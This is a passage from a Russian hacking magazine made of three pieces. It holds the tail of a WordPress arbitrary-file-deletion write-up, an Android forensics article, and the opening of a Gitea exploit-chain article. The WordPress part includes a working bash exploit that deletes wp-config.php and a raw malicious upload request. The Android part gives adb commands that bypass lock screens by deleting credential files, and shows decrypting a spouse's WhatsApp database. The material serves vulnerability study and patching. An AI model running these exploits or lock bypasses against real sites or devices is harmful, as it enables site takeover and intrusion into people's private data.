   Дальше уже можно включить воображение. Например, выполнить установ‐
ку, указав свой сервер в качес тве базы данных. Тогда ты получишь при виле‐
гии администратора в CMS, а там уже прямая дорога до RCE через встро‐
енное редактирование файлов.
  Я накидал небольшой (и не слишком красивый) скриптик на bash, который
автоматизирует всю работу. В качес тве параметров передаем URL Word‐
Press, логин и пароль нужного пользователя.


#!/bin/bash
echo 1 > /tmp/nonextfile.doc
rm /tmp/wpexplcookies
curl ‐s "$1/wp‐login.php" ‐d "log=$2&pwd=$3&rememberme=forever&
wp‐submit=Log+In&testcookie=1" ‐c /tmp/wpexplcookies > /dev/null
wpnonce=$(curl ‐s "$1/wp‐admin/media‐new.php" ‐b /tmp/wpexplcookies
| grep '"_wpnonce"' | grep ‐oP 'value="[a‐z0‐9]{10}"' | grep ‐oP '[
a‐z0‐9]{10}')
attachid=$(curl ‐s "$1/wp‐admin/async‐upload.php" ‐b /tmp/wpexpl
cookies ‐F 'html‐upload=Upload' ‐F 'post_id=0' ‐F "_wpnonce=$wpnonce"
 ‐F 'async‐upload=@/tmp/nonextfile.doc')
wpnonces=$(curl ‐s "$1/wp‐admin/post.php?post=$attachid&action=edit"
‐b /tmp/wpexplcookies | grep '_wpnonce')
wpnonce_edit=$(echo $wpnonces | grep '"_wpnonce"' | grep ‐oP
'value="[a‐z0‐9]{10}"' | grep ‐oP '[a‐z0‐9]{10}')
wpnonce_delete=$(echo $wpnonces | grep ‐oP 'delete.*' | grep ‐oP
'_wpnonce=[a‐z0‐9]{10}' | grep ‐oP '[a‐z0‐9]{10}')
curl ‐s "$1/wp‐admin/post.php?post=$attachid" ‐b /tmp/wpexplcookies
‐d "action=editattachment&_wpnonce=$wpnonce_edit&thumb=../../../../
wp‐config.php"
curl ‐s "$1/wp‐admin/post.php?post=$attachid&action=delete&_wpnonce=
$wpnonce_delete" ‐b /tmp/wpexplcookies




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

 УДАЛЕННОЕ УДАЛЕНИЕ
           КАК ЗАХВАТИТЬ КОНТРОЛЬ НАД WORDPRESS,
                     ЗАСТАВИВ ЕГО СТЕРЕТЬ ФАЙЛ





УДАЛЯЕМ ФАЙЛЫ. ВЕРСИЯ 2.0
После того как ребята из RIPS Tech выложили в паб лик детали уязвимости,
разработчик плагина Wordfence Мэтт Барри (Matt Barry) обнаружил еще один
вариант удаления произвольного файла. Здесь нам нужно обратиться к экше‐
ну upload‐attachment. Он исполь зует ся при загрузке файлов с помощью
AJAX.


/wordpress/wp-admin/async-upload.php
09: if ( isset( $_REQUEST['action'] ) && 'upload‐attachment' === $
_REQUEST['action'] ) {
10:     define( 'DOING_AJAX', true );
11: }
...
27: if ( isset( $_REQUEST['action'] ) && 'upload‐attachment' === $
_REQUEST['action'] ) {
28:     include( ABSPATH . 'wp‐admin/includes/ajax‐actions.php' );
29:
30:     send_nosniff_header();
31:     nocache_headers();
32:
33:     wp_ajax_upload_attachment();

Функция  wp_ajax_upload_attachment  обрабатывает  переданный  файл
и возвращает необходимые данные пос ле его заг рузки.


/wordpress/wp-admin/includes/ajax-actions.php
2058: function wp_ajax_upload_attachment() {
...
2066:   if ( ! current_user_can( 'upload_files' ) ) {
...
2095:     $post_data = isset( $_REQUEST['post_data'] ) ? $_REQUEST['
post_data'] : array();
...
2113:   $attachment_id = media_handle_upload( 'async‐upload', $
post_id, $post_data );

Данные, которые переда ются в парамет ре запроса post_data, уходят в фун‐
кцию media_handle_upload. А затем попада ют в wp_insert_attachment
в виде аргумента $attachment.


/wordpress/wp-admin/includes/media.php
273: function media_handle_upload($file_id, $post_id, $post_data =
array(), $overrides = array( 'test_form' => false )) {
...
368:    // Construct the attachment array
369:    $attachment = array_merge( array(
370:        'post_mime_type' => $type,
371:        'guid' => $url,
372:        'post_parent' => $post_id,
373:        'post_title' => $title,
374:        'post_content' => $content,
375:        'post_excerpt' => $excerpt,
376:    ), $post_data );
...
382:    $id = wp_insert_attachment( $attachment, $file, $post_id,
true );

В итоге все это оказыва ется в функции wp_insert_post. Она сохраня ет
переданные данные в базу.


/wordpress/wp-includes/post.php
4957: function wp_insert_attachment( $args, $file = false, $parent =
0, $wp_error = false ) {
...
4971:   return wp_insert_post( $data, $wp_error );

Тут есть интересный учас ток кода.


3103: function wp_insert_post( $postarr, $wp_error = false ) {
...
3493:   if ( ! empty( $postarr['meta_input'] ) ) {
3494:       foreach ( $postarr['meta_input'] as $field => $value ) {
3495:           update_post_meta( $post_ID, $field, $value );
3496:       }
3497:   }

Здесь данные из meta_input сохраняются в таблицу wp_postmeta, о которой
мы уже знаем. Еще раз заглянем в нее.





                 Содержимое таб лицы postmeta

В _wp_attached_file хра нится путь до загруженного файла, и при удалении
аттача в CMS файл удаляется из системы.


246: case 'delete':
...
260:        if ( ! wp_delete_attachment( $post_id, $force ) )
4993: function wp_delete_attachment( $post_id, $force_delete = false
) {
...
5017:   $file = get_attached_file( $post_id );


/wordpress/wp-includes/post.php
331: function get_attached_file( $attachment_id, $unfiltered = false
) {
332:    $file = get_post_meta( $attachment_id, '_wp_attached_file',
true );
4993: function wp_delete_attachment( $post_id, $force_delete = false
) {
...
5090:   wp_delete_file( $file );


/wordpress/wp-includes/functions.php
5492: function wp_delete_file( $file ) {
...
5500:   $delete = apply_filters( 'wp_delete_file', $file );
5501:   if ( ! empty( $delete ) ) {
5502:       @unlink( $delete );
5503:   }

Поэтому для удаления нужного файла в запросе на загрузку передадим путь
до него в качестве параметра post_data[meta_input][_wp_attached_‐
file]. На этот раз нужный путь считается от директории /wp‐content/up‐
loads/, поэтому указываем ../../wp‐config.php.


POST /wp‐admin/async‐upload.php?post_data[meta_input][_wp_at
tached_file]=../../wp‐config.php HTTP/1.1
Host: wpdel.visualhack
Content‐Length: 1145
User‐Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Content‐Type: multipart/form‐data; boundary=‐‐‐‐WebKitFormBound
aryQJJgtwiCWvSPyaTV
Accept: */*
Cookie: <валидные_куки>
<данные_формы>

Результат аналогичен — уда ление произвольного файла.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
В результате уязвимость позволяет любому пользователю с привиле гиями
автора, отправив два запроса, полностью перехватить контроль над сайтом
WordPress и выпол нить произвольный код на сервере. Хотя для эксплу атации
и требуется учетная запись, но существу ет огромное количество сайтов, где
можно получить такие привилегии, прос то зарегис трировавшись. В любом
случае этот баг сто ит рассматривать как повышение привилегий.
   Чтобы не стать жертвой зло умышленни ков, в срочном порядке обновляйся
на  новую  версию  WordPress,  где  добавили  функцию  wp_delete_‐
file_from_directory, выполняющую необ ходимые проверки.


function wp_delete_file_from_directory( $file, $directory ) {
    $real_file = realpath( wp_normalize_path( $file ) );
    $real_directory = realpath( wp_normalize_path( $directory ) );
    if ( false === $real_file || false === $real_directory || strpos(
 wp_normalize_path( $real_file ), trailingslashit( wp_normalize_path(
 $real_directory ) ) ) !== 0 ) {
        return false;
    }
    wp_delete_file( $file );
    return true;
}

Если по какой‐то причине ты не можешь обновить CMS, то рекомендую вос‐
пользоваться временным патчем авторства RIPS Tech.


add_filter( 'wp_update_attachment_metadata', 'rips_unlink_tempfix' );
function rips_unlink_tempfix( $data ) {
    if( isset($data['thumb']) ) {
        $data['thumb'] = basename($data['thumb']);
    }
    return $data;
}

Этот код нужно добавить в файл functions.php твоей текущей темы. Это,
конечно же, не гарантирует полную безопасность, так как не учитывает все
возможные сценарии атаки. Например, через пла гины. Так что настоятельно
рекомендую обновиться.
ВЗЛОМ
ANDROID
ПОД КОЛПАКОМ
КАК РАСКРЫВАЮТ
КЕЙСЫ ВЗЛОМА
МОБИЛЬНЫХ УСТРОЙСТВ





     Иван Пискунов





Личная и деловая переписка, деньги, фотографии, заметки,
планы на будущее и удаленный доступ к рабочим инструмен‐
там — все это сегодня заключа ется в маленькой стосоро‐
камиллиметровой пластиковой коробочке, которую каж дый
цивилизованный человек носит с собой постоянно. Неуди‐
вительно, что все чаще она становится целью для хакеров.
Сегодня мы рас смотрим Android c точки зрения специалиста
по форензике, пройдемся по теории, рассмотрим инстру‐
ментарий и решим пару настоящих криминалистических кей‐
сов.


Пре дыду щие статьи цик ла
Советуем также прочесть первую, вто рую и третью статьи из нашего цикла
по расследованию компьютерных преступлений.



НЕМНОГО ОБ ОСОБЕННОСТЯХ ПЛАТФОРМЫ ANDROID
Android представ ляет собой модифицированную версию ядра Linux, адап‐
тированную под мобильные гаджеты и носимые девайсы. За работу приложе‐
ний (application) отвечает встроенная вир туаль ная машина Dalvik, преобра‐
зующая байт‐код приложений в инс трукции для исполнения начинкой устрой‐
ства. Однако с версии Android 4.4 Dalvik был заменен на более шуструю An‐
droid Runtime, хотя сути работы это не поменя ло. Рабочее окружение, так же
как и в традиционном Linux, дополняют на тивные и сторонние библиотеки,
обеспечивающие различные профиль ные функции девайса.





           Архитек тура Android во мно гом совпадает с Linux

Наследие Linux в Android проявляется в управлении процессами, в организа‐
ции файловой системы, подсистемы доступа и разрешений (user‐based per‐
mission model, SELinux и root mode), ну и, конечно же, в поддержке терминала
и некоторых команд из стандартного core utilities. Это во многом роднит An‐
droid и Linux, несмотря на то что различий между сис темами тоже много.
Но эти знания помогут тебе в решении некоторых задач в наших кейсах.


ГОТОВИМ ЛАБОРАТОРИЮ ДЛЯ ИССЛЕДОВАНИЙ
Для  нашей  импровизированной  лаборатории  понадобится  следующий
минимальный набор инс трументов:
 • Android SDK — стандартный пакет SDK для Android‐разработчика;
 • Mobile drivers — пак драйверов для подключения исследуемого девайса
   к хостовой машине, с которой сидит эксперт‐криминалист.


           WARNING

                       Всегда ясно и четко осознавай, какое именно
                      действие и для какой цели ты совершаешь. Неп‐
                       равильное использование приведенных в тексте
                         статьи  программ  может  привести  к  потере
                    информации   (арте фак тов)   или   искажению
                       полученных дан ных (криминалистических доказа‐
                         тельств). Ни автор, ни редак ция не несут ответс‐
                        твенности за любой ущерб, причиненный неп‐
                       равильным использованием материалов данной
                          статьи.


Итак, самым первым и обязательным шагом подготовки нашей лаборатории
будет установка на наш компь ютер Android SDK и пакета драй веров. Пос‐
ледний часто идет универсальным паком, то есть содержит драйверы
для большинства современ ных девайсов, и они автоматичес ки опре делят
подклю ченную модель. В редких случаях приходится доустанавливать необ‐
ходимый драйвер вручную, либо тоже паком, как Android Device Driver Pack,
либо ручками, найдя нужный в каталогах типа Android Find Driver.





                 Установка Android SDK на Windows 10





                Выбор компонентов Android SDK

Особо ленивые могут установить ADB вместе со всеми драйверами и аддо‐
нами «одним кликом» с помощью ADB Installer.





              «Тихий уста новщик» ADB Installer для Windows

Очень важная составляющая SDK — Android Virtual Device, компонент, поз‐
воляющий создавать виртуальные обра зы системы и после запус кать их
на своей машине. По сути, это эмулятор системы, соз данный для разработ‐
чиков, пишущих приложения под эту платформу.





         Конфигуратор образа для запус ка в Android Virtual Device





          Запущен ный в эмуляторе AVD образ системы Nexus 5


Первое под ключение
После установки SDK и пакета драй веров можно смело линковать наш
девайс к компьюте ру при помощи USB‐кабеля. Предварительно в опциях
девайса нужно активировать режим USB mass storage, то есть режим внеш‐
него USB‐накопителя. Это поможет нам в даль нейшем выполнять команды
с ADB‐консоли. Также обязательно активировать режим отладки Android De‐
bug Bridge (ADB) в секции «Для разработчиков».





        Включение режима отладки по USB в настройках Android

Основные подготовительные операции на этом завершены. Теперь запус‐
каем командный интерпретатор CMD.EXE и через него шелл, который пре‐
доставит нам доступ к девайсу:


C:\ADB_folder>adb.exe devices
List of devices attached:
4df155сс115e4f21 device





           Окно cmd.exe с выводом подключенного девайса

Так, мы законнектили наш девайс к компь ютеру. Теперь можно получить внут‐
ренний шелл Android‐устройства и проверить вывод, к примеру набрав
команду whoami:


C:\ADB_folder>adb.exe shell
shell@android:/ $ whoami





          Окно cmd.exe с выполненной в ADB командой shell

Приглашение $ в командной стро ке говорит о том, что мы находимся в неп‐
ривилегированном поль зовательском режиме. Символ # — приглашение
с правами суперполь зователя.
  Более подробно о работе ADB и том, что с ее помощью можно сде лать,
читай в одной из наших ста тей.

Мини‑шпар галка по самым вос тре бован ным коман дам
ADB
 • adb startserver — запуск службы ADB на локальном компьютере;
 • adb killserver — оста новить службу ADB (завершить процесс и выг‐
   рузить из памяти);
 • adb devices — получить список подключенных устройств;
 • adb getstate — получить ста тус текущих подключений;
 • adb logcat — просмотр логов в режиме реального времени в консоли;
 • adb logcat *:E — выводить на экран только ошибки (system error);
 • adb backup option packets — выполнить резервное копирование;
 • adb reboot — перезагрузить устройство;
 • adb reboot recovery — загрузиться в режим recovery;
 • adb reboot bootloader — перейти в режим настройки загрузчика.



Создаем копию внутренней памяти Android‐устройства. Для этого в CLI
девайса пишем:


> dd if=/dev/block/mmcblk0 of=/sdcard/blk0.img bs=4096

Не забудь предварительно убедиться, что в смартфон или другое устройство
вставлена SD‐карточка, на которую будет писать ся образ, иначе он запишет‐
ся во внутреннюю память устройства, и тогда часть артефактов потеряется
и фактическая картина инцидента будет искажена.
   Чтобы сде лать копию уже имеющейся SD‐карты, можно воспользоваться
знакомой нам бесплатной утилитой FTK Imager. Кста ти, этот же образ потом
можно будет и просмотреть в программе.


Источники дан ных
Прежде чем приступить к поиску и извлечению артефактов, нужно опре‐
делиться с основными источниками, которые мы будем анализировать,
и местами их хранения во внут ренней памяти Android‐девайса.
  Все данные приложений, в том числе системных, сохраня ются в дирек‐
тории /data/data/. Одна ко дос туп к этой директории возможен только с пра‐
вами  суперпользователя,  так  что  если  наше  устройство  изначально
не рутовано, то нам предстоит это сделать.
  Каждое приложение  (app) представляет собой одноименный  пакет,
как правило вида <com.name_app.base>, где name.app — имя приложе ния,
которое пользователь видит в Google play или уже в своем телефоне, а *.
base — это некая сигнатура, определя ющая, что именно содержит пакет,
к примеру:
 • .contacts — список кон тактов;
 • .maps — карты и коор динаты геоло кации;
 • .telephony — списки SMS‐ и MMS‐сообщений.

Внутри пакета по сути набор директорий, где в соответствии с внутренней
логикой приложения содержатся те или иные данные. К примеру, обычно
визуальный и аудиоконтент хранит ся в /media, фотокарточки и аватары —
в /photos , данные профиля — в /profile, кеш — в /chache. Конечно, бывают
и исклю чения, так что иногда приходит ся ручками залезать в каждый каталог
и просматривать его.


             INFO

                     Подробнее  о  системных  и  пользовательских
                       директориях в Android можно узнать из этого ма‐
                       териала.


Рассмотрим самые основные источники данных.

1. Кон такты и журнал вызовов
  Имя пакета: com.android.providers.contacts
  Интересующие эксперта директории и фай лы:
 • /ﬁles/
 • photos/
 • proﬁle/
 • /databases/
 • contacts2.db — основная БД, содержащая список контактов, открывается
   с помощью SQL Manager Lite (viewer)

2. Сооб щения SMS и MMS
  Имя пакета: com.android.providers.telephony
  Интересующие эксперта директории и фай лы:
 • /app_parts
 • /databases/
 • mmssms.db — БД с SMS‐ и MMS‐сообщениями
 • telephony.db — журнал звонков

3. Поч та Gmail
  Имя пакета: com.google.android.gm
  Интересующие эксперта директории и фай лы:
 • /cache
 • /databases/
 • mailstore.@gmail.com.db
 • databases/suggestions.db
 • /shared_prefs/
 • MailAppProvider.xml
 • Gmail.xml
 • UniﬁedEmail.xml

4. Google Chrome
  Имя пакета: com.android.chrome
  Интересующие эксперта директории и фай лы:
 • /app_chrome/Default/
 • Sync Data/SyncData.sqlite3
 • Bookmarks
 • Cookies
 • Google Proﬁle Picture.png
 • History
 • Login Data
 • Preferences
 • Top Sites
 • Web Data
 • /app_ChromeDocumentActivity/

5. Google Maps
  Имя пакета: com.google.android.apps.maps
  Интересующие эксперта директории и фай лы:
 • /cache/http/
 • /databases/
 • gmm_myplaces.db — сохраненные места на картах Google Maps
 • gmm_storage.db — мес та, отмеченные геолокацией

6. Facebook (без мессен дже ра)
  Имя пакета: com.facebook.katana
  Интересующие эксперта директории и фай лы:
 • /ﬁles/video‐cache/
 • /cache/images/
 • /databases/
 • bookmarks_db2
 • contacts_db2
 • nearbytiles_db
 • newsfeed_db
 • notiﬁcations_db
 • prefs_db
 • threads_db2

7. Viber
  Имя пакета: com.viber.voip
  Интересующие эксперта директории и фай лы:
 • /ﬁles/preferences/
 • activated_sim_serial
 • display_name
 • reg_viber_phone_num
 • /sdcard/viber/media/
 • /User Photos/
 • /Viber Images/
 • /Viber Videos/
 • /databases/
 • viber_data
 • viber_messages

8. WhatsApp
  Имя пакета: com.whatsapp
  Интересующие эксперта директории и фай лы:
 • /ﬁles/
 • Avatars/
 • me
 • me.jpeg
 • /shared_prefs/
 • RegisterPhone.xml
 • VerifySMS.xml
 • /databases/
 • msgstore.db
 • wa.db
 • /sdcard/WhatsApp/
 • Media/
 • Databases/

Помимо стандартных приложений, на устройство может быть установлено
фейковое или вредоносное ПО, поэто му еще одним источником данных
может послужить изучение *.apk‐файла, вытянутого из внутренней памяти.
Но это уже больше относится к реверсингу малвари и выходит за рамки нас‐
тоящей статьи. Однако для вирус ных ана литиков и форензик‐специалис тов
это настоящий кладезь ценной информации. Более подробно о реверсинге
APK ты можешь почитать в статьях на Хакере тут и вот тут.


Ру тинг устройства
Рутинг — это получение прав суперпользователя, то есть root’а на Android‐
совместимом девайсе. В ходе рутинга в систему устанавливаются приложе‐
ние SuperSU, бинарный файл SU и набор кон сольных утилит BusyBox. Root‐
права дадут нам пол ный контроль над системой, возможность бес препятс‐
твенно получать доступ к системным директориям, пользовательским данным
и их содержимому, что как раз и требуется.
  Среди программ для рутования Android‐девайса на сегодняшний день
наиболее популярны Unlock Root, Kingo Android ROOT, Universal AndRoot
и iRoot. Хотя найдется еще с десяток дру гих, которые сделают это не хуже.
Сам процесс рутования мы рассматривать не будем, отметим лишь, что все
названные проги име ют GUI‐интерфейс и, как пра вило, одну кнопку. ;)





  Окно программы Kingo Android ROOT для получения прав root на Android‐
  устройстве





                  Окно программы Unlock Root





  Стартовое окно тулзы iRoot, поз воляющей получить права суперполь‐
  зователя


             INFO

                   В случае если девайc был физически пов режден
                      и информация утеряна, часть дан ных можно поп‐
                       робовать  восстановить  на  новый  аппарат
                       из  облачного  хранилища  Dropbox,   GDrive,
                        с  которыми  устройство  синхронизирова лось.
                     Для этого достаточно получить доступ к при‐
                       вязанному аккаунту Google.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
           ANDROID
     ПОД КОЛПАКОМ
                   КАК РАСКРЫВАЮТ КЕЙСЫ ВЗЛОМА
                      МОБИЛЬНЫХ УСТРОЙСТВ





Сброс пароля и графического ключа
Один из основных вопросов при начале анализа — как получить дос туп
к устройству. И на первых порах помешать это му может установленный гра‐
фический ключ или пароль. Но для нас это будет совсем не большой проб‐
лемой. Поступить можно дву мя способами: либо узнать сам PIN/Password,
либо просто обнулить их.





  Графический ключ и пароль как первичная защита смартфона от пос ‐
  тороннего доступа

Хеш графического ключа хранится в фай ле /data/system/gesture.key,
а пароля — в /data/system/password.key. В принципе, пароль можно поп‐
робовать и побрутить, благо на это есть готовые радужные таблицы, но тут
Android оказался не так плох, и в password.key хеш пароля хранится с солью.
А         сама         соль         лежит         по          пути
/data/data/com.android.providers.settings/databases/settings.db
для Android версии 4.4 и ниже и собственно в /data/system/lockset-
tings.db для версий старше, чем 4.4. Хотя есть утилиты, способные методом
перебора и разделения соли выдать нам готовые PIN/Key, мы так извращать‐
ся не станем и пой дем более быстрым и жес тким путем. :)


Допол нитель ная инфа о взло ме пина и пароля
Дополнительную инфу о взломе пина/пароля можно почитать тут, вот тут и тут.


Итак, приступим к разблокировке девайса. Как я писал выше, если нет файла,
то нет условия проверки, а значит, чтобы скинуть Lock Screen, нам нужно
просто удалить несколь ко файлов. В консоли ADB пишем:


> adb shell
su
rm /data/system/locksettings.db
rm /data/system/locksettings.db‐wal
rm /data/system/locksettings.db‐shm
reboot

Если же после перезагрузки девайса трюк не удался, то сделай еще так:


> adb shell
rm /data/system/gesture.key

И как вариант, еще прописать измененные данные в базу данных без уда‐
ления файлов:


> adb shell
cd /data/data/com.android.providers.settings/databases
sqlite3 settings.db
update system set value=0 where name='lock_pattern_autolock';
update system set value=0 where name='lockscreen.lockedoutperman
ently';
.quit

Вот, собственно, и все! Дело сделано, дорога рас чищена. :)
  Для любопытных есть еще одна утилита — UFED User Lock Code Recovery
Tool, полностью автоматизирующая байпасинг. Все, что нужно, — это под‐
клю чить девайс по USB‐кабелю и выбрать соот ветс твующую опцию в окне
программы. И на всякий случай — есть еще аналогичный онлайн‐сервис An‐
driller.


Полез ные статьи на Хакере
 • Мобильная криминалис тика. Извлекаем и ана лизи руем данные из устрой‐
   ств на Android
 • Мобильная криминалис тика. Извлекаем данные из iOS‐устройств и про‐
  водим их анализ




ОСНОВНОЙ ИНСТРУМЕНТАРИЙ
Теперь об инструментах, которые мы будем юзать для форензики нашего An‐
droid‐девайса.
 • ViaExtract — это очень крутая прога, которая позволяет извлекать данные
   как на логическом, так и на физичес ком уровне, вытаскивать бэкапы,
   рутовать девайс в один клик, а также имеет внутренний парсер и прос мот‐
  рщик директорий, содержимого в них (картинки, аудио, видео), умеет
   делать репор ты в фор мате XML, PFD или JSON!





    Главное окно программы ViaExtract перед подклю чением к устройству

 • Autopsy — известная по нашим прош лым статьям прога для анализа фай‐
   ловых систем и вос становления уда лен ных и allocated‐файлов с воз‐
  можностью мгновенного предпросмотра, экспорта и каталогизации.





         Главное окно программы Autopsy перед началом работы

 • ViaLab Community Edition — софтина, чем‐то родственная ViaExtract, поз‐
   воляет извлекать крайне ценные данные, как то содержание телефонной
   книги, журнала SMS, паролей от Gmail и других сервисов Google, пассы
   от сохраненных профилей Wi‐Fi и тому подоб ное.





          Стартовое окно программы ViaLab Community Edition

 • Oxygen Mobile forensic — очень крутой комбайн утилит для извлечения раз‐
   личных данных с девайса: календаря, журналов звонков, SMS‐переписки,
   телефонной книги, уда ленных контактов, системных логов и тому подоб‐
   ного. Must have в арсенале эксперта‐кри мина лис та, занимающегося рас‐
   следованиями на мобильных платформах.





  Окно программы Oxygen Mobile forensic, содержащее извлеченные дан‐
  ные

 • SQL Manager Lite — уже известная нам утилита для просмотра баз данных
   (контакты, списки групп и так далее), которые мы можем вытянуть из внут‐
   ренней памяти исследуемого девай са.





                Ос новное окно SQL Manager Lite


КЕЙС 1. УКРАДЕННЫЙ ТЕЛЕФОН
Кейс представляет собой банальную историю утери (кражи) телефона неко‐
его топ‐менеджера одной из солидных фирм. Внутри корпоративная почта,
аккаунты, привязанные к различным CRM‐, ERP‐системам, удаленный доступ
к рабочему ноутбуку и куча сохраненных файлов, содержащих конфиден‐
циальную информацию (отчеты, планы, презентации, вложения писем). Через
пару дней телефон был случайно обнаружен (подбро шен?) в офисе. Однако
непонятно, кто и с какой целью его похитил. Соответственно, встал вопрос:
что злоумышленники делали с телефоном все то время, которое он отсутс‐
твовал у владельца?
  Первым делом скидыва ем цифровой пароль и получаем доступ к смар‐
тфону (а у хозяина спросить пароль нельзя было? :) — Прим. ред.). Далее
тратим несколько минут на рутинг девайса и получаем права суперполь‐
зователя.





          Сброс пароля для Android‐устройства в консоли ADB





      Приглашение # в командной строке — рутинг прошел успешно

Восстанавливаем SMS, список контактов и журнал вызовов, пишем в консоли
ADB:


> adb pull –p /data/data/com.android.providers.telephony/databases/
mmssms.db
C:/Users/Forensic/Case_0001

После копирования открываем файл mmssms.db вьювером SQL Manager
Lite, либо, если предваритель но прогнать через Autopsy, сразу будет дос‐
тупен предпросмотр.





           Обнаруженная база данных SMS‐сообщений

Дальше после прогона Autopsy мы можем получить список контактов, журнал
вызовов и выстроить по ним таймлайн,  чтобы опре делить, звонил ли
по каким‐то номерам телефонов наш зло умышленник.





             Артефакты, найденные в программе Autopsy

Далее просматриваем список Wi‐Fi‐сетей, к которым подключался девайс.
Для этого нужно пройти по пути /data/misc/wifi/wpa_supplicant.conf
и извлечь файл wpa_supplicant.conf. Этот файл содержит в себе открытым
текстом (без какого‐либо шифрования!) данные о подключениях к Wi‐Fi: имя
точки доступа, пароль и некото рые служебные данные, необходимые для под‐
клю чения.





                 Данные файла wpa_supplicant.conf

Как видим, кроме кор поративной сети с дефол тными настройками, наш аппа‐
рат больше никуда не подключался. И как мини‐вывод: либо никаких подклю‐
чений злоумышленнику и не требовалось, либо данные об этом подключении
после завершения коннекта были уда лены.
  Ищем удаленные файлы с помощью Autopsy.





      Обнаруженные уда ленные JPG‐фай лы в программе Autopsy

По результатам поиска нам так и не удалось обнаружить никаких серьезных
артефактов, свидетельству ющих о неправомерных действиях с телефоном.
Очевидно, что зло умышленник мог прос то получить визуальный доступ, прос‐
мотрев, к примеру, почтовые сообщения, сохраненные вложения и, воз‐
можно, перекопировав пароли дос тупа к дру гим корпоративным системам
(если их просмотр без смены был воз можен). Как вариант, мог быть снят пол‐
ный дамп памяти телефона. Но к сожалению, подобные манипу ляции никак
не отражаются в системе, и констатировать их невозможно.


КЕЙС 2. РЕВНИВАЯ ЖЕНА
Очень банальная ситуация в духе детективных агентств из классических
романов. К нам в лабораторию обра тилась дама с просьбой найти следы
измены ее благоверного. Несмотря на то что муж заявляет обратное
и никаких компрометирующих данных на поверхностный взгляд в смартфоне
нет, мы попробуем установить истину. :)
   Итак, что мы будем искать в первую очередь? Это переписка в мессен‐
джере WhatsApp, сох раненные (и, воз можно, уже удаленные) фотографии
во внутренней памяти и на SD‐карте, а также звонки и SMS‐сообщения. Ведь
это же прямые доказатель ства, не так ли? :)
  Снова извлекаем данные о SMS/MMS, журнал звонков и список контактов.
На сей раз будем действовать при помощи Oxygen Mobile forensic. Пос ле
нескольких минут ожидания получаем листинг отправленных SMS и совер‐
шенных звонков.





  Окно программы Oxygen Mobile forensic с аналитикой по SMS и звонкам

Пробуем нащупать удаленные фотовидеофайлы, которые могли быть отправ‐
лены или получе ны от интересующего нас адресата. В дело идет уже извес‐
тный Autopsy.





   Фотки, удаленные с SD‐карты, но обна руженные программой Autopsy

Ну что, дело за WhatsApp, уж там‐то должно быть много инте ресного!
  Дергаем два файла:
 • /data/data/com.whatsapp/databases/msgstore.db
 • /data/data/com.whatsapp/databases/wa.db

Файл wa.db хранит в себе список контактов, их номеров, активность и даты
чатов. Кстати, WhatsApp периодически делает резервную копию, которую
хранит      локально,      взять      ее     можно      по      пути
/sdcard/WhatsApp/Databases/msgstore.db.crypt. А ключ шиф рования
лежит по пути userdata/data/com.whatsapp/files/key .





                Содержание файла msgstore.db

Берем программу WhatsApp DB/Key Extractor и скармливаем ей наш ключ,
указывая путь к msgstore.db, даль ше выбираем опцию Decrypt и отправ‐
ляемся пить кофе. :)
  В итоге у нас расшифрованная база данных всех чатов с содержанием
бесед и пересылаемых данных (их метаданных).





                     Заг рузка клю ча шифрования





             Начало дешифрирова ния (подбора ключа)





       Окно, сооб щающее об успешном окончании дешифрования





          Расшифрованная база msgstore.db в SQL Manager Lite

Вот, собственно, и все! Следы контактов с «пос торонними лицами» были
обнаружены. Хотя, конечно, показанные операции — это лишь часть большой
работы, что была продела на дру гими специалис тами.
ВЗЛОМ
ПО ЦЕПОЧКЕ
УЯЗВИМОСТЕЙ

ПОЛУЧАЕМ ПОЛНЫЙ КОНТРОЛЬ
НАД GITEA С НУЛЯ





          aLLy
         ONsec
        @iamsecurity





В этой статье я расскажу о нескольких уязвимостях в продук‐
те Gitea. Это опенсорсная альтернатива GitHub, то есть сер‐
вис для работы с репозиториями Git. Основное отличие это‐
го дистрибутива — в простоте настройки и использования:
ты получаешь рабочую систему буквально в пару команд. Мы
же пройдемся по цепочке уязвимостей, которая в конечном
счете приведет к полной компромета ции системы с воз‐
можностью выполнения про извольных команд.


             INFO

                          Gitea — это форк небезызвестной Gogs, написан‐
                     ный на языке Go.


Моя основная система — это Windows, поэтому на ней и будем разбирать
примеры. Для запуска сво его Git‐сервиса дос таточно просто скачать нужную
версию и выполнить одну команду.
   Уязвимы все версии до 1.4‐rc3 вклю чительно. Я решил использовать вер‐
сию 1.3.3. Загрузим ее с официального сай та. Пос ле этого соз дадим отдель‐
ную папку, в которую перекинем ска чанный файл. Дальше из командной стро‐
ки выполняем следующие команды.





                     Запуск Gitea на Windows

После запуска приложения в текущей директории будут созданы конфигура‐
ционные файлы. Перехо дим по адресу http://localhost:3000 и попадаем
на экран первоначальной нас тройки сис темы. Тут все просто, и можно оста‐
вить все настрой ки по умолчанию. Только в качес тве используемой БД я выб‐
рал SQLite 3, потому что не хочу замора чиваться с отдельным сервером.





                   Начальная настройка Gitea

После базовой настройки остается только соз дать аккаунт и тестовый
репозиторий.





                  Создание поль зователя в Gitea

Если ты хочешь использовать Linux в качес тве подопытной сис темы, то уяз‐
вимый докер‐контейнер можно поднять такой командой:


$ docker run ‐d ‐‐rm ‐p 3000:3000 ‐‐name=gitea vulhub/gitea:1.4.0

Остальные шаги будут ана логичны установке под Windows.


ПЕРВОЕ ЗВЕНО ЦЕПОЧКИ. PATH TRAVERSAL
Первая уязвимость в цепочке связана с обходом авторизации. Здесь стоит
рассказать о Git LFS. Это специальный контей нер, который создан для хра‐
нения очень больших файлов Large File System (LFS). Такие файлы хранятся
вне основной директории репозитория Git, а в нем находятся только файлы
индекса. При первоначальной конфигура ции Gitea можно указать путь этой
папки (опция LFS Root Path), по умолчанию она установлена в data/lfs
для Windows‐вер сии сервера и /data/gitea/lfs/ для Linux.
   Вся логика для работы с HTTP‐запросами  к LFS описана в файле
modules/lfs/server.go. Посмотрим на об работчик POST‐запросов, служащий
для отправ ки информации о больших фай лах.


/modules/lfs/server.go
199: func PostHandler(ctx *context.Context) {
200:
201:    if !setting.LFS.StartServer {
202:        writeStatus(ctx, 404)
203:        return
204:    }
205:
206:    if !MetaMatcher(ctx.Req) {
207:        writeStatus(ctx, 400)
208:        return
209:    }
...
